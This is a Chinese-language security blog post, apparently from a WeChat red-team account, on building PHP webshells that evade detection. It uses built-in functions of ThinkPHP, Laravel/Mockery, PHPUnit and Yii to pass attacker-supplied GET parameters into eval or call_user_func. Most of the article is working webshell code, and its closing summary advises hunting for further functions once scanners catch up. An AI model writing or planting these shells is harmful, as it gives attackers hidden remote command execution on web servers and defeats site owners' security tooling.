<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_31K7YYjCI7VJtp_T-dFVg)

基于框架免杀
======

thinkphp
--------

### array_map_recursive函数

```
<?php  
define('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));  
include(WWW_PATH."ThinkPHP/Common/functions.php");  
array_map_recursive(I('get.func','',''),I('get.cmd','',''));  

```

array_map_recursive函数分析

这里存在一个call_user_func命令执行函数

```
function array_map_recursive($filter, $data) {  
     $result = array();  
     foreach ($data as $key => $val) {  
         $result[$key] = is_array($val)  
             ? array_map_recursive($filter, $val)  
             : call_user_func($filter, $val);  
     }  
     return $result;  
 }  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1astv8w3z13prhfJKOym1Z7oCLvlkx1YFHnCiaeqMwzJu0DNnaz2k64w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

免杀效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### B函数

```
<?php  
define('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));  
include(WWW_PATH."ThinkPHP/Common/functions.php");  
include(WWW_PATH."ThinkPHP/Library/Think/Hook.class.php");  
  
class demo{  
    function test($v){  
        I('get.func','','')($v);  
    }  
  
}  
B("demo","test",I('get.cmd','',''));  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

免杀效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

B函数分析

```
function B($name, $tag='',&$params=NULL) {  
    if(''==$tag){  
        $name   .=  'Behavior';  
    }  
    return \Think\Hook::exec($name,$tag,$params);  
}  

```

exec函数分析

在exec函数用存在有个类调用，且所有的参数都可控

```
 static public function exec($name, $tag,&$params=NULL) {  
        if('Behavior' == substr($name,-8) ){  
            // 行为扩展必须用run入口方法  
            $tag    =   'run';  
        }  
        $addon   = new $name();  
        return $addon->$tag($params);  
    }
```

### smarty_php_tag函数

```
<?php  
define('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));  
include(WWW_PATH."ThinkPHP/Library/Vendor/Smarty/SmartyBC.class.php");  
  
smarty_php_tag("",I('get.cmd','',''),"");  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

免杀效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

smarty_php_tag函数分析

直接存在命令执行，且参数可控

```
function smarty_php_tag($params, $content, $template, &$repeat)  
{  
    eval($content);  
    return '';  
}  

```

### I函数

```
<?php  
define('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));  
include(WWW_PATH."ThinkPHP/Common/functions.php");  
I('get.func','','')(I('get.cmd','',''));  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

免杀效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Laravel
-------

### EvalLoader#load

```
<?php  
define('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));  
include(WWW_PATH."/vendor/autoload.php");  
  
$c = new Mockery\Generator\MockConfiguration(array(),array(),array(),'demo');  
$b = new Mockery\Generator\MockDefinition($c,'<?='.$_GET['cmd']);  
$a = new Mockery\Loader\EvalLoader();  
$a->load($b);  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

免杀效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### EvalLoader#load分析

eval命令执行函数，参数可控

```
class EvalLoader implements Loader  
{  
    public function load(MockDefinition $definition)  
    {  
        if (class_exists($definition->getClassName(), false)) {  
            return;  
        }  
  
        eval("?>" . $definition->getCode());  
    }  
}  
  

```

### MockTrait#generate

```
<?php  
define('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));  
include(WWW_PATH."/vendor/autoload.php");  
$a = new PHPUnit\Framework\MockObject\MockTrait($_GET['cmd'],'demo');  
$a->generate();  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

免杀效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### MockTrait#generate函数分析

存在一个eval函数

```
 public function generate(): string  
    {  
        if (!\class_exists($this->mockName, false)) {  
            eval($this->classCode);  
        }  
  
        return $this->mockName;  
    }
```

yii
---

### MockTrait#generate

```
<?php  
define('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));  
include(WWW_PATH."/vendor/autoload.php");  
$a = new PHPUnit\Framework\MockObject\MockTrait($_GET['cmd'],'demo');  
$a->generate();  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

免杀效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### view#evaluateDynamicContent

```
<?php  
define('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));  
include(WWW_PATH."/vendor/autoload.php");  
$a = new yii\base\View();  
$a->evaluateDynamicContent($_GET['cmd']);  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

免杀效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### view#evaluateDynamicContent分析

```
 public function evaluateDynamicContent($statements)  
    {  
        return eval($statements);  
    }
```

总结
--

通过文件包含框架文件，用框架内置的函数来替换一句话木马中的功能函数，达到绕过特征匹配，如果后期规则增强，可以通过搜索新的函数来间接调用函数，像反序列化利用链一样，当然，还有很多其他函数可以使用在这里就不多列举。

加下方wx，拉你一起进群学习

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

往期推荐

[

什么？你还不会webshell免杀？（一）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498204&idx=1&sn=6d1196d195193296ac413bc64e5a71c4&chksm=ce674360f910ca763cb59c834b63e7bc010a7020ba4ef06c5be05d0b8f0dbc78b6dd485b451a&scene=21#wechat_redirect)

[

什么？你还不会webshell免杀？（二）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499857&idx=1&sn=b49ca696334f2161e7311ad625ee84c6&chksm=ce677aedf910f3fb0fa061a7d3b403980dfccb2fc59acf0aec87bb722b90c6715241448cb86c&scene=21#wechat_redirect)

[什么？你还不会webshell免杀？（三）](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500845&idx=1&sn=73e9a559ce1c1d48b6895d87cfcda078&chksm=ce677e91f910f787c4c8c403dfb3e23027bb379e47053a1b3f489d8487d86b75f7dd6286fa05&scene=21#wechat_redirect)

 ![](http://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6flNJqwg2VJrVbXvO9N2mzz6piagicPIiaCNPGH1tNA1N43RLy5bLY4PyUqNGYocicJMqrusALD0icibkg/0?wx_fmt=png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 85篇原创内容   公众号

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)